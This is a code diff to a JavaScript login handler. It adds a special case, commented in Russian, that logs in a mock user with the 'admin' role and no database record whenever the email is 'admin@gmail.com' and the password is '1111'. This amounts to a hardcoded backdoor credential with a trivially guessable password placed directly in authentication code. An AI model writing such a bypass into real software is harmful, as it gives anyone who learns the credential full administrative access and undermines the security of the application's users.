@@ -70,6 +70,32 @@ export const registerUser = async (req, res) => {
 export const loginUser = async (req, res) => {
   const { email, password } = req.body;
 
+  // 🔐 Специальный случай — вход как "админ без записи в базе"
+  if (email === 'admin@gmail.com' && password === '1111') {
+    const mockAdmin = {
+      _id: 'admin-static-id',
+      email: 'admin@gmail.com',
+      username: 'SuperAdmin',
+      role: 'admin',
+      status: 'approved'
+    };
+
+    req.login(mockAdmin, (err) => {
+      if (err) {
+        return res.status(500).json({ message: 'Login error' });
+      }
+      return res.status(200).json({
+        message: 'Login successful',
+        user: {
+          id: mockAdmin._id,
+          username: mockAdmin.username,
+          email: mockAdmin.email
+        }
+      });
+    });
+    return;
+  }
+
   try {
     const user = await User.findOne({ email });
 
